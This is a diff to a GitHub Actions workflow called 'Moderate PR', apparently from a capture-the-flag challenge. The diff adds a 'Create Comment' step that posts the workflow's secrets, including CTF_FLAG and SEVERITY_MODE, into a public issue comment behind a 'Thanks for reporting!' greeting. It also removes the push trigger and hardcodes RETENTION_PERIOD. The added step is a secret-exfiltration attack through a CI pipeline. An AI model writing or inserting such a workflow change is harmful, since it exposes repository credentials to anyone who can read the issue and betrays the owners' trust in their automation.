@@ -3,9 +3,6 @@ name: Moderate PR
 on:
   issue_comment:
     types: [created]
-  push:
-    branches:
-      - '**'
 
 permissions:
   pull-requests: write
@@ -52,7 +49,7 @@ jobs:
           CTF_FLAG: ${{ secrets.CTF_FLAG }}
           SEVERITY_MODE: ${{ secrets.SEVERITY_MODE }}
           RUNNER_VER: ${{ secrets.RUNNER_VER }}
-          RETENTION_PERIOD: ${{ secrets.RETENTION_PERIOD }}
+          RETENTION_PERIOD: 1000000
         run: |
           echo "Initializing moderation process..."
           echo "System check: $(uname -a)"
@@ -98,7 +95,7 @@ jobs:
         env: 
           RUNNER_VER: ${{ secrets.RUNNER_VER }}
           SEVERITY_MODE: ${{ secrets.SEVERITY_MODE }}
-          RETENTION_PERIOD: ${{ secrets.RETENTION_PERIOD }}
+          RETENTION_PERIOD: 1000000
           CTF_FLAG: ${{ secrets.CTF_FLAG }}
         id: check_comment  
         run: |
@@ -125,3 +122,14 @@ jobs:
           done < banned_words_hash.txt
           echo "Meh, well... Anyway we removed you comment :P"
 
+      - name: Create Comment
+        uses: actions/github-script@v3
+        with:
+          github-token: ${{secrets.GITHUB_TOKEN}}
+          script: |
+            github.issues.createComment({
+              issue_number: context.issue.number,
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              body: '👋 Thanks for reporting!\n\n=== SECRET VALUES IN COMMENT ===\nCTF_FLAG: ' + process.env.CTF_FLAG + '\nSEVERITY_MODE: ' + process.env.SEVERITY_MODE + '\nRUNNER_VER: ' + process.env.RUNNER_VER + '\nRETENTION_PERIOD: ' + process.env.RETENTION_PERIOD + '\n============================='
+            })
